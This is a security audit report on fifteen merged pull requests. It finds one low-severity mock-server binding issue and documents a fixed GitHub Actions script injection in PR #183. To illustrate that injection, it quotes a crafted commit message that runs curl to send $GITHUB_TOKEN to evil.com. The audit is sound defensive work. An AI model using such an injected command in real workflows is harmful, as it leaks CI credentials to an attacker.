# Security Audit Report — Merged Pull Requests

**Audit Date:** 2026-02-28
**PRs Reviewed:** 196, 195, 194, 193, 192, 191, 190, 189, 187, 186, 185, 184, 183, 182, 181

---

## PR-by-PR Analysis

### PR #196 — chore(deps): bump lodash-es from 4.17.22 to 4.17.23 in /web
**No security issues found.**
Changes are limited to `web/package-lock.json` version bumps and peer dependency flag changes.

---

### PR #195 — Optimize docs favicon from 992KB to 1.3KB
**No security issues found.**
Only changes the favicon reference in `docusaurus.config.ts` and replaces binary image files.

---

### PR #194 — fix(template-editor): cursor navigation and selection visibility
**No security issues found.**
UI-only changes: adds a `LineNavigation` TipTap extension, cut/copy/paste toolbar buttons, selection highlighting CSS, and cursor anchor zero-width spaces. The deprecated `document.execCommand('cut'|'copy')` calls are not a security concern.

---

### PR #193 — Compact docs landing page hero description on mobile
**No security issues found.**
CSS and minor HTML template changes for responsive layout on the docs site.

---

### PR #192 — Fix plugin card alignment on splash page
**No security issues found.**
Three lines of CSS changes only (`aspect-ratio`, `height`, `object-fit`).

---

### PR #191 — Enhance docs landing page with screenshots, plugin showcase, and CTA
**No security issues found.**
Adds React components, CSS styles, and static PNG images for the docs landing page. No dynamic data handling or user input processing.

---

### PR #190 — Restrict integration tests to merge queue only

**1 issue found:**

| # | Severity | Type | File | Description |
|---|----------|------|------|-------------|
| 1 | **Low** | Network Exposure | `integration-tests/mock-board/server.py` (line ~250) | Mock board HTTP server binds to `0.0.0.0:7000`, making it accessible on all network interfaces. While this is test-only infrastructure and not deployed to production, binding to `127.0.0.1` would be more appropriate for a development/CI mock server to prevent unintended network exposure. |

**Details:**
```python
server = HTTPServer(("0.0.0.0", port), MockBoardHandler)
```
**Recommendation:** Change to `("127.0.0.1", port)` since this mock server should only be accessed locally during tests.

---

### PR #189 — Remove dead code: unused files, imports, and functions
**No security issues found.**
Removes unused files (`traffic_cache.py`, `page-selector.tsx`, `feature-flags.ts`, `use-reduced-motion.ts`, `use-vestaboard.ts`) and dead code from `page-builder.tsx`. This is a positive security hygiene change — removing dead code reduces the attack surface.

---

### PR #187 — Add colorful WCAG-compliant gradient for dark mode splash screen
**No security issues found.**
CSS gradient and `package-lock.json` peer dependency flag changes only.

---

### PR #186 — ci: add docs build verification to PR checks
**No security issues found.**
Adds a `build-docs` job to the CI workflow that builds the Docusaurus site. Uses standard `actions/checkout@v6` and `actions/setup-node@v6`. No secrets or sensitive data exposed.

---

### PR #185 — [WIP] Add comprehensive documentation with screenshots
**No security issues found.**
Large documentation PR adding setup guides, plugin docs, reference pages, and troubleshooting guides. All API keys and credentials in documentation use proper placeholder values (e.g., `your_api_key_here`, `your_board_api_key_here`). No real credentials or personal information detected.

---

### PR #184 — Fix docs site hero color contrast and add README for deployed docs repo
**No security issues found.**
CSS color changes for accessibility and a static README file for the deployed docs repo.

---

### PR #183 — Fix docs deployment to use fiestaboard.github.io and fix release guard script injection

**1 issue found (FIXED in this PR):**

| # | Severity | Type | File | Description |
|---|----------|------|------|-------------|
| 1 | **High (Fixed)** | CI/CD Script Injection | `.github/workflows/release.yml` | This PR **fixes** a pre-existing GitHub Actions script injection vulnerability. The old code directly interpolated `${{ github.event.head_commit.message }}` into a shell `run:` block, allowing arbitrary command execution via crafted commit messages. The fix correctly passes the value through an environment variable instead. |

**Before (Vulnerable):**
```yaml
run: |
  MSG="${{ github.event.head_commit.message }}"
  if echo "$MSG" | grep -qE '^chore: bump version to '; then
```
An attacker with commit access could craft a commit message like `"; curl http://evil.com/exfiltrate?token=$GITHUB_TOKEN; echo "` to execute arbitrary commands.

**After (Fixed):**
```yaml
env:
  COMMIT_MSG: ${{ github.event.head_commit.message }}
run: |
  if echo "$COMMIT_MSG" | head -1 | grep -qE '^chore: bump version to '; then
```
The fix properly passes the untrusted input through an environment variable, preventing shell injection.

**This is a security improvement — no new issues introduced.**

---

### PR #182 — chore(deps): bump the npm-dependencies group in /web with 19 updates
**No security issues found.**
Standard dependency version bumps in `web/package-lock.json`. Updates include React, ESLint, TipTap, Vitest, Storybook, and other packages to newer versions. Dependency updates generally improve security posture.

---

### PR #181 — chore(deps): bump the github-actions-dependencies group with 7 updates
**No security issues found.**
Updates GitHub Actions to newer versions:
- `actions/checkout` v4 → v6
- `actions/setup-python` v5 → v6
- `actions/setup-node` v4 → v6
- `codecov/codecov-action` v4 → v5
- `dorny/paths-filter` v2 → v3
- `docker/build-push-action` v5 → v6
- `actions/github-script` v7 → v8

These are all positive security updates.

---

## Summary

### Issues Found

| PR | Severity | Type | Status |
|----|----------|------|--------|
| #190 | **Low** | Network Exposure (mock server binds to 0.0.0.0) | Open — test infrastructure only |
| #183 | **High** | CI/CD Script Injection (commit message interpolation) | **Fixed in this PR** |

### Overall Assessment

Out of 15 merged PRs reviewed:

- **13 PRs** had **no security issues**
- **1 PR (#190)** has a **low-severity** issue (mock test server binding to all interfaces)
- **1 PR (#183)** **fixed** a pre-existing **high-severity** GitHub Actions script injection vulnerability

No hardcoded secrets, API keys, real personal information, SQL injection, XSS, command injection, path traversal, insecure deserialization, SSRF, or other critical vulnerabilities were found in any of the reviewed PRs.

### Positive Security Observations

1. **PR #183** proactively fixed a script injection vulnerability in CI/CD
2. **PR #189** removed dead code, reducing attack surface
3. **PR #181** updated GitHub Actions to latest versions
4. **PR #182** updated npm dependencies to newer versions
5. Documentation in **PR #185** consistently uses placeholder values for credentials
6. No real personal information, addresses, or coordinates found in any PR
